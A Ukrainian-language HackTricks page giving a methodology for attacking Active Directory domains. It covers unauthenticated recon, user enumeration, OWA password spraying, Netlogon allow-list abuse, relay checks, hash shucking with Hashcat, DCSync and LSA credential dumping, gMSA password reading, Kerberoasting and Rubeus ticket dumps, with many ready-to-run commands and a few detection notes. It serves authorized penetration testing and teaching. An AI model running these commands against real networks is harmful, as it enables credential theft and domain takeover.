# Методологія Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Основний огляд

**Active Directory** — це фундаментальна технологія, що дає змогу **мережевим адміністраторам** ефективно створювати й керувати **доменами**, **користувачами** та **об’єктами** в мережі. Вона розроблена з урахуванням масштабування: дає змогу впорядковувати велику кількість користувачів у зручні для керування **групи** та **підгрупи**, контролюючи **права доступу** на різних рівнях.

Структура **Active Directory** складається з трьох основних рівнів: **доменів**, **дерев** і **лісів**. **Домен** охоплює сукупність об’єктів, наприклад **користувачів** або **пристроїв**, які використовують спільну базу даних. **Дерева** — це групи доменів, об’єднаних спільною структурою, а **ліс** — це сукупність кількох дерев, з’єднаних **відносинами довіри**, що утворюють найвищий рівень організаційної структури. На кожному з цих рівнів можна визначити конкретні **права доступу** та **права на комунікацію**.

Ключові поняття **Active Directory**:

1. **Каталог** — зберігає всю інформацію про об’єкти Active Directory.
2. **Об’єкт** — позначає сутності в каталозі, зокрема **користувачів**, **групи** або **спільні папки**.
3. **Домен** — контейнер для об’єктів каталогу. У межах **лісу** можуть співіснувати кілька доменів, кожен зі своєю сукупністю об’єктів.
4. **Дерево** — група доменів зі спільним кореневим доменом.
5. **Ліс** — найвищий рівень організаційної структури в Active Directory, що складається з кількох дерев із **відносинами довіри** між ними.

**Active Directory Domain Services (AD DS)** охоплює низку служб, критично важливих для централізованого керування мережею та комунікації в ній. До цих служб належать:

1. **Служби домену** — централізують зберігання даних і керують взаємодією між **користувачами** та **доменами**, зокрема функціями **автентифікації** та **пошуку**.
2. **Служби сертифікатів** — відповідають за створення, розповсюдження й керування безпечними **цифровими сертифікатами**.
3. **Служби каталогів Lightweight** — підтримують програми з підтримкою каталогів за допомогою **протоколу LDAP**.
4. **Служби федерації каталогів** — надають можливість **єдиного входу (single sign-on)** для автентифікації користувачів у кількох вебзастосунках протягом одного сеансу.
5. **Керування правами** — допомагає захищати матеріали, захищені авторським правом, обмежуючи їхнє несанкціоноване розповсюдження та використання.
6. **Служба DNS** — критично важлива для визначення **доменних імен**.

Детальніше дивіться: [**TechTerms — визначення Active Directory**](https://techterms.com/definition/active_directory)

### **Автентифікація Kerberos**

Щоб навчитися **атакувати AD**, потрібно добре **розуміти процес автентифікації Kerberos**.\
[**Прочитайте цю сторінку, якщо ще не знаєте, як він працює.**](kerberos-authentication.md)

## Шпаргалка

Щоб швидко переглянути команди для переліку даних і експлуатації AD, перейдіть на [https://wadcoms.github.io/](https://wadcoms.github.io).

> [!WARNING]
> Для зв’язку Kerberos зазвичай **потрібне повне доменне ім’я (FQDN)**, щоб клієнт міг отримати квиток для правильного SPN. Під час доступу до машини за IP-адресою зазвичай замість Kerberos використовується NTLM.

## Розвідка Active Directory (без облікових даних/сеансів)

Якщо ви маєте доступ до середовища AD, але не маєте облікових даних або сеансів, можна:

- **Провести pentest мережі:**
  - Просканувати мережу, знайти машини й відкриті порти та спробувати **експлуатувати вразливості** або **отримати облікові дані** з них (наприклад, [принтери можуть бути дуже цікавими цілями](ad-information-in-printers.md)).
  - Перелік DNS може надати інформацію про ключові сервери в домені: вебсервери, принтери, спільні ресурси, VPN, медіасервери тощо.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Перегляньте загальну [**методологію pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md), щоб дізнатися більше про те, як це робити.
- **Перевірити доступ null і Guest до служб SMB** (це не працюватиме в сучасних версіях Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Докладніший посібник із переліку даних на SMB-сервері доступний тут:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Перелічити дані LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Докладніший посібник із переліку даних LDAP доступний тут (зверніть **особливу увагу на анонімний доступ**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Отруїти мережу**
  - Зібрати облікові дані, [**видаючи себе за служби за допомогою Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Отримати доступ до хоста, [**зловживаючи relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Зібрати облікові дані, **виставивши** [**підроблені служби UPnP за допомогою evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Отримати імена користувачів і повні імена з внутрішніх документів, соціальних мереж, служб (переважно вебсайтів) у доменному середовищі, а також із загальнодоступних джерел.
  - Якщо знайдете повні імена працівників компанії, можна спробувати різні **формати імен користувачів AD** ([**прочитайте це**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Найпоширеніші формати: _Ім’яПрізвище_, _Ім’я.Прізвище_, _Ім’яПрізвище_ (по 3 літери з кожного), _Ім’я.Прізвище_ (по 3 літери з кожного), _ІніціалПрізвище_, _Ініціал.Прізвище_, _ПрізвищеІм’я_, _Прізвище.Ім’я_, _ПрізвищеІніціал_, _Прізвище.Ініціал_, 3 _випадкові літери й 3 випадкові цифри_ (abc123).
  - Інструменти:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Перелік користувачів

- **Анонімний перелік SMB/LDAP:** перегляньте сторінки [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) і [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Перелік за допомогою Kerbrute**: коли сервер отримує **запит із недійсним ім’ям користувача**, він відповідає кодом помилки **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, що дає змогу визначити недійсне ім’я користувача. Для **дійсних імен користувачів** сервер повертає або **TGT у відповіді AS-REP**, або помилку _KRB5KDC_ERR_PREAUTH_REQUIRED_, яка вказує, що користувач має пройти попередню автентифікацію.
- **Без автентифікації через MS-NRPC**: використання рівня автентифікації = 1 (без автентифікації) для інтерфейсу MS-NRPC (Netlogon) на контролерах домену. Після прив’язування до інтерфейсу MS-NRPC цей метод викликає функцію `DsrGetDcNameEx2`, щоб перевірити, чи існує користувач або комп’ютер, без облікових даних. Інструмент [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) реалізує цей тип переліку даних. Дослідження доступне [тут](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Якщо ви виявили один із цих серверів у мережі, ви також можете виконати **перерахування користувачів на ньому**. Наприклад, можна скористатися інструментом [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Списки імен користувачів можна знайти в [**цьому репозиторії github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) та в цьому ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Однак у вас мають бути **імена людей, які працюють у компанії**. Їх можна отримати під час етапу recon, який слід було виконати раніше. Маючи ім’я та прізвище, можна скористатися скриптом [**namemash.py**](https://gist.github.com/superkojiman/11076951), щоб згенерувати потенційно дійсні імена користувачів.

### Зловживання allow-list для вразливого каналу Netlogon (Onelogon)

Навіть після встановлення виправлення для **Zerologon** на DC, облікові записи, явно додані до allow-list, усе ще можуть бути вразливими до **застарілої/вразливої поведінки захищеного каналу Netlogon**. Ризикована конфігурація — це GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** або відповідне значення реєстру **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Це значення — дескриптор безпеки **SDDL** (див. [Security Descriptors](security-descriptors.md)). Будь-який обліковий запис або група, якій надано відповідний ACE у DACL, можуть стати ціллю. Наприклад, `O:BAG:BAD:(A;;RC;;;WD)` фактично додає до allow-list **Everyone**.

Практичний порядок дій оператора:

1. **Визначте принципали в allow-list**, перевіривши і **SYSVOL/GPO**, і **реєстр активного DC**.
2. **Визначте SID**, знайдені в SDDL, щоб встановити відповідних користувачів/комп’ютери AD, і надайте пріоритет **обліковим записам комп’ютерів DC**, **обліковим записам довірених доменів** та іншим привілейованим машинам.
3. Повторно пробуйте автентифікацію **MS-NRPC / Netlogon** від імені облікового запису з allow-list.
4. Після успішного підбору зловживайте **встановленням пароля через Netlogon**, щоб скинути пароль цільового облікового запису (публічний PoC задає порожній рядок).<sup>[[9]](#references)[[10]](#references)</sup>

Приклади швидкого triage / лабораторних сценаріїв із публічного артефакту:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Примітки:

- **Сканер** корисний, оскільки ефективний список дозволених може зберігатися в **SYSVOL**, у **реєстрі** або в обох місцях.
- Сам шлях експлуатації важливий, оскільки після виявлення вразливого облікового запису він **не потребує привілеїв Domain Admin**.
- Компрометація **облікового запису комп’ютера контролера домену**, такого як `DC$`, особливо небезпечна, оскільки скидання його пароля може безпосередньо відкрити ширші шляхи до **захоплення AD**.
- **Можливість brute-force** залежить від режиму: у відкритому артефакті описано підхід meet-in-the-middle, **24-бітний** brute force за наявності іншого облікового запису комп’ютера та повільніші **32-бітні** варіанти.

Примітки щодо виявлення та посилення захисту:

- Перевірте політику списку дозволених і видаліть усе, крім тимчасових, чітко обґрунтованих винятків для сумісності.
- Відстежуйте події **5827/5828/5829/5830/5831** у журналі **System** контролерів домену, щоб виявляти відхилені, виявлені або явно дозволені політикою вразливі підключення Netlogon.
- Вважайте облікові записи у `VulnerableChannelAllowList` **високоризиковими**, доки не буде усунуто залежність від застарілої системи.

### Відоме одне або кілька імен користувачів

Гаразд, ви вже знаєте дійсне ім’я користувача, але не маєте паролів... Тоді спробуйте:

- [**ASREPRoast**](asreproast.md): Якщо користувач **не має** атрибута _DONT_REQ_PREAUTH_, можна **запросити повідомлення AS_REP** для цього користувача; воно міститиме дані, зашифровані ключем, отриманим із пароля користувача.
- [**Password Spraying**](password-spraying.md): Спробуйте **найпоширеніші паролі** для кожного з виявлених користувачів — можливо, хтось використовує ненадійний пароль (не забувайте про політику паролів!).
  - Також можна виконати **spraying серверів OWA**, щоб спробувати отримати доступ до поштових серверів користувачів.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Можливо, вам вдасться **отримати** деякі challenge **хеші**, виконавши **poisoning** окремих мережевих протоколів:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Перерахування Active Directory надає імена користувачів, ідентифікатори електронної пошти та шаблони іменування, потенційні хости й служби, які можна примусити до автентифікації. Використовуйте цю інформацію, щоб визначити можливі [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM і потенційні шляхи проникнення в середовище AD.

### NetExec: recon на основі workspace та перевірки стану relay

- Використовуйте **workspace `nxcdb`**, щоб зберігати дані recon AD окремо для кожного завдання: `workspace create <name>` створює бази даних SQLite для кожного протоколу в `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap тощо). Перемикайте подання командою `proto smb|mssql|winrm`, а зібрані секрети переглядайте командою `creds`. Після завершення вручну видаліть конфіденційні дані: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Швидке виявлення підмережі за допомогою **`netexec smb <cidr>`** показує **домен**, **збірку ОС**, **вимоги до підписування SMB** і **Null Auth**. Вузли, для яких показано `(signing:False)`, **вразливі до relay**, тоді як для контролерів домену підписування часто є обов’язковим.
- Створюйте **імена хостів у /etc/hosts** безпосередньо з виводу NetExec, щоб спростити націлювання:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Коли **SMB relay до DC заблоковано** через підписування, усе одно перевірте стан **LDAP**: `netexec ldap <dc>` показує `(signing:None)` / слабке channel binding. DC, для якого підписування SMB обов’язкове, але підписування LDAP вимкнене, залишається придатною ціллю для **relay-to-LDAP**-атак, як-от **SPN-less RBCD**.

### Витоки облікових даних через принтери на стороні клієнта → масова перевірка доменних облікових даних

- Вебінтерфейси принтерів іноді **вбудовують замасковані паролі адміністратора в HTML**. Перегляд вихідного коду/інструментів розробника може виявити пароль у відкритому вигляді (наприклад, `<input value="<password>">`), що дає змогу отримати доступ через Basic-auth до сховищ сканів/друку.
- Отримані завдання друку можуть містити **документи для адаптації працівників із паролями користувачів у відкритому вигляді**. Під час перевірки зберігайте відповідність паролів користувачам:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Викрадення облікових даних NTLM

Якщо ви можете **отримати доступ до інших ПК або спільних ресурсів** із **null- або guest-користувачем**, можна **розмістити файли** (наприклад, SCF-файл), які в разі доступу до них **спричинять автентифікацію NTLM проти вас**, щоб ви могли **викрасти** **NTLM challenge** і crack його:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking і NT-Candidate Attacks

**Hash shucking** використовує кожен наявний у вас NT hash як кандидат на пароль для інших, повільніших форматів, ключовий матеріал яких безпосередньо походить від NT hash. Замість brute-force довгих парольних фраз у Kerberos RC4 tickets, NetNTLM challenges або кешованих облікових даних ви передаєте NT hashes у режими NT-candidate у Hashcat, щоб перевірити повторне використання паролів, не дізнаючись їх у відкритому вигляді. Це особливо ефективно після компрометації домену, коли можна зібрати тисячі поточних і історичних NT hashes.<sup>[[5]](#references)</sup>

Використовуйте shucking, якщо:

- У вас є NT corpus із DCSync, дампів SAM/SECURITY або сховищ облікових даних, і потрібно перевірити повторне використання в інших доменах/лісах.
- Ви перехопили матеріал Kerberos на основі RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), відповіді NetNTLM або blobs DCC/DCC2.
- Ви хочете швидко підтвердити повторне використання довгих, незламних парольних фраз і відразу перейти до Pass-the-Hash.

Ця техніка **не працює** з типами шифрування, ключі яких не є NT hash (наприклад, Kerberos etype 17/18 AES). Якщо домен вимагає лише AES, потрібно повернутися до звичайних режимів підбору паролів.

#### Створення NT hash corpus

- **DCSync/NTDS** – Використовуйте `secretsdump.py` з історією, щоб отримати якомога більше NT hashes (і їхніх попередніх значень):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Записи історії значно розширюють пул кандидатів, оскільки Microsoft може зберігати до 24 попередніх хешів для кожного облікового запису. Інші способи отримати секрети NTDS дивіться тут:

{{#ref}}
dcsync.md
{{#endref}}

- **Дампи кешу кінцевих точок** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (або Mimikatz `lsadump::sam /patch`) витягує локальні дані SAM/SECURITY і кешовані доменні логіни (DCC/DCC2). Видаліть дублікати й додайте ці хеші до того самого списку `nt_candidates.txt`.
- **Відстежуйте метадані** – Зберігайте ім’я користувача/домен, для яких отримано кожен хеш (навіть якщо список слів містить лише hex). Збіг хешів одразу покаже, який принципал повторно використовує пароль, коли Hashcat виведе знайдений кандидат.
- Віддавайте перевагу кандидатам із того самого лісу або довіреного лісу; це максимізує ймовірність збігу під час shucking.

#### Режими NT-кандидатів Hashcat

| Тип хешу                                | Режим пароля | Режим NT-кандидатів |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Примітки:

- Вхідні дані NT-кандидатів **мають залишатися необробленими NT-хешами з 32 hex-символів**. Вимкніть рушії правил (без `-r` і гібридних режимів), оскільки модифікація спотворює матеріал ключа кандидата.
- Ці режими не є швидшими самі по собі, але простір ключів NTLM (~30 000 MH/s на M3 Max) приблизно у 100 разів швидший за Kerberos RC4 (~300 MH/s). Перевірка підібраного списку NT обходиться значно дешевше, ніж перебір усього простору паролів у повільному форматі.
- Завжди використовуйте **найновішу збірку Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), оскільки режими 31500/31600/35300/35400 з’явилися нещодавно.<sup>[[7]](#references)</sup>
- Наразі режиму NT для AS-REQ Pre-Auth немає, а для AES etypes (19600/19700) потрібен пароль у відкритому вигляді, оскільки їхні ключі виводяться за допомогою PBKDF2 з паролів у UTF-16LE, а не з необроблених NT-хешів.

#### Приклад – Kerberoast RC4 (режим 35300)

1. Отримайте RC4 TGS для цільового SPN за допомогою користувача з низькими привілеями (детальніше дивіться на сторінці Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Витягніть ticket за допомогою вашого NT list:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat виводить ключ RC4 з кожного кандидата NT і перевіряє blob `$krb5tgs$23$...`. Збіг підтверджує, що обліковий запис служби використовує один із ваших наявних NT-хешів.

3. Негайно переходьте до PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   За потреби пізніше можна відновити відкритий текст за допомогою `hashcat -m 1000 <matched_hash> wordlists/`.

#### Приклад – кешовані облікові дані (режим 31600)

1. Зробіть dump кешованих логонів із скомпрометованої робочої станції:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Скопіюйте рядок DCC2 для цікавого доменного користувача у `dcc2_highpriv.txt` і виконайте для нього shucking:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Успішний збіг дає відомий вам NT hash, що доводить повторне використання пароля кешованим користувачем. Використайте його безпосередньо для PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) або підберіть його в швидкому режимі NTLM, щоб відновити пароль.

Той самий процес застосовується до challenge-response NetNTLM (`-m 27000/27100`) і DCC (`-m 31500`). Щойно збіг буде знайдено, можна запустити relay, PtH через SMB/WMI/WinRM або повторно зламати NT hash офлайн за допомогою масок/правил.



## Перелічення Active Directory З обліковими даними/сеансом

На цьому етапі вам потрібно **скомпрометувати облікові дані або сеанс дійсного доменного облікового запису.** Якщо у вас є дійсні облікові дані або shell від імені доменного користувача, **пам’ятайте, що наведені раніше варіанти все ще можна використати для компрометації інших користувачів**.

Перш ніж починати автентифіковане перелічення, розберіться з **проблемою подвійного переходу Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Перелічення

Компрометація облікового запису — це **важливий крок до оцінювання домену**, оскільки вона дає змогу виконувати автентифіковане **перелічення Active Directory**:

Щодо [**ASREPRoast**](asreproast.md), тепер ви можете знайти всіх потенційно вразливих користувачів; щодо [**Password Spraying**](password-spraying.md), ви можете отримати **список усіх імен користувачів** і спробувати пароль скомпрометованого облікового запису, порожні паролі та нові перспективні паролі.

- Для базової розвідки можна використати [**CMD**](../basic-cmd-for-pentesters.md#domain-info)
- Також можна використати [**powershell для розвідки**](../basic-powershell-for-pentesters/index.html), що буде менш помітно
- Також можна [**використати powerview**](../basic-powershell-for-pentesters/powerview.md), щоб отримати детальнішу інформацію
- Ще один чудовий інструмент для розвідки в Active Directory — [**BloodHound**](bloodhound.md). Він **не дуже непомітний** (залежно від використаних методів збору даних), але **якщо вас це не турбує**, обов’язково спробуйте його. Дізнайтеся, де користувачі можуть підключатися через RDP, знайдіть шлях до інших груп тощо.
  - **Інші автоматизовані інструменти перелічення AD:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Перевірте [**DNS-записи AD**](ad-dns-records.md), оскільки вони можуть містити цікаву інформацію.
- Для перелічення каталогу можна скористатися **інструментом із GUI** **AdExplorer.exe** з набору **SysInternal** Suite.
- Також можна шукати в базі даних LDAP за допомогою **ldapsearch**, щоб знайти облікові дані в полях _userPassword_ і _unixUserPassword_, а також у примітках _description_ та _info_ користувачів. Непозначений рядок у полі _info_, схожий на пароль, — лише можливий кандидат: окремо перевірте його призначення та дійсність і не включайте вміст приміток до стандартного виводу перелічення. Інші методи наведено в матеріалі [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Перевірте доступні сценарії входу в домен і зіставлення дисків у `\\<dc>\NETLOGON` або `\\<dc>\SYSVOL\<domain>\scripts`, якщо це дозволено вашими правами. [Документація Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) описує призначення каталогу сценаріїв у спільному ресурсі NETLOGON. Спочатку перегляньте назви, а потім — лише релевантні доступні для читання сценарії в межах обмеження розміру; не вивантажуйте весь спільний ресурс і не виводьте значення облікових даних під час стандартного перелічення. Виклик PowerShell [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **не захищає** буквальний пароль, збережений у сценарії. Сам по собі цей виклик не доводить, що секрет жорстко задано: простежте, звідки саме надходять дані, а потім окремо перевірте обліковий запис, дійсність облікових даних і привілеї. Перевірка доменного сценарію — це перевірка віддаленого спільного ресурсу, окрема від перелічення локального хоста.
- Якщо ви використовуєте **Linux**, домен також можна перелічити за допомогою [**pywerview**](https://github.com/the-useless-one/pywerview).
- Також можна спробувати такі автоматизовані інструменти:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Отримання всіх користувачів домену**

  Усі імена користувачів домену дуже легко отримати у Windows (`net user /domain` ,`Get-DomainUser` або `wmic useraccount get name,sid`). У Linux можна використати: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` або `enum4linux -a -u "user" -p "password" <DC IP>`

> Хоча розділ про перелічення здається невеликим, це найважливіша частина всього процесу. Перейдіть за посиланнями (передусім на CMD, powershell, powerview і BloodHound), навчіться перелічувати домен і практикуйтеся, доки не почуватиметеся впевнено. Під час оцінювання це буде ключовий момент, щоб знайти шлях до DA або вирішити, що нічого зробити не можна.

### Передбачувані попередньо створені облікові записи комп’ютерів -> доступ до пароля gMSA

Облікові записи комп’ютерів, підготовлені для застарілих приєднань до домену, можуть зберігати передбачуваний початковий пароль. Модуль NetExec `pre2k` знаходить характерне значення `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) і намагається отримати Kerberos TGT, використовуючи перші 14 символів назви комп’ютера в нижньому регістрі без кінцевого `$`. Розглядайте це значення UAC як критерій для відбору можливих кандидатів, а не вважайте, що належність до **Pre-Windows 2000 Compatible Access** сама по собі доводить слабкість пароля.<sup>[[18]](#references)[[20]](#references)</sup>

Використовуйте автентифіковане перелічення LDAP, щоб перевірити кандидатів і зберегти успішно отримані TGT. `ALL=True` розширює перевірку за межі об’єктів, що відповідають стандартному фільтру `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Невдалий default/NTLM bind **не** спростовує цей висновок: перевірте за допомогою `-k`, FQDN, який резолвиться в DC, і годинника, синхронізованого з KDC. У разі успішного запуску модуля списки кандидатів і отримані ccaches записуються в `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Після компрометації облікового запису комп’ютера побудуйте граф його вкладених членств у групах і прав на вихідні підключення. Зокрема, облікові записи, зазначені в дескрипторі безпеки `msDS-GroupMSAMembership` облікового запису gMSA, можуть читати `msDS-ManagedPassword`; вивід NetExec із `--gmsa` показує дозволені облікові записи та повертає поточний NT hash, якщо комп’ютер, що проходить автентифікацію, має відповідні права.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Потім оцініть отриману gMSA так само, як будь-які інші облікові дані: перевірте членство в локальних/доменних групах, права входу, SPN, делегування та доступні служби, перш ніж пробувати pass-the-hash. Цей шлях отримання на основі ACL відрізняється від [Golden gMSA/dMSA](golden-dmsa-gmsa.md), який дає змогу обчислювати керовані паролі після компрометації кореневого ключа KDS.<sup>[[20]](#references)</sup>

Комп’ютерний principal також може мати вихідний контроль над іншими комп’ютерними об’єктами або групами. Після отримання такого principal окремо перевірте його вкладене членство та ефективні ACL: право запису в інший комп’ютерний об’єкт може дозволити змінити обліковий запис, а права членства в групі — надати роль для входу. Прапорець підготовленого облікового запису, передбачувана схема іменування або зв’язок `GenericWrite` самі по собі не доводять, що повний шлях існує.

Окрема проблема — доступна для читання копія blob `msDS-ManagedPassword` у файлі, спільному ресурсі або резервній копії: ACL читання LDAP не захищає копію, збережену деінде. Перш ніж інтерпретувати дані, переконайтеся, що це blob керованого пароля, і відрізняйте цей випадок як від авторизованого читання через LDAP, так і від обчислення пароля на основі кореневого ключа KDS.

### Kerberoast

Kerberoasting передбачає отримання **TGS-квитків**, які використовують служби, пов’язані з обліковими записами користувачів, і **офлайн** зламування їхнього шифрування, яке ґрунтується на паролях користувачів.

Детальніше про це:

{{#ref}}
kerberoast.md
{{#endref}}

### Віддалене підключення (RDP, SSH, FTP, Win-RM тощо)

Отримавши облікові дані, перевірте, чи маєте доступ до будь-якої **машини**. Для цього можна скористатися **CrackMapExec**, щоб спробувати підключитися до кількох серверів за різними протоколами відповідно до результатів сканування портів.

### Локальне підвищення привілеїв

Якщо ви скомпрометували облікові дані або отримали сеанс звичайного користувача домену й маєте доступ до **будь-якої машини в домені**, пошукайте спосіб **підвищити привілеї локально та зібрати облікові дані**. Привілеї локального адміністратора можуть дозволити **дампити хеші інших користувачів** із пам’яті (LSASS) і локального сховища (SAM).

У цій книзі є ціла сторінка про [**локальне підвищення привілеїв у Windows**](../windows-local-privilege-escalation/index.html) і [**контрольний список**](../checklist-windows-privilege-escalation.md). Також не забудьте скористатися [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Квитки поточного сеансу

**Дуже малоймовірно**, що серед **квитків** поточного користувача ви знайдете такі, що **надають доступ** до неочікуваних ресурсів, але перевірити можна:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

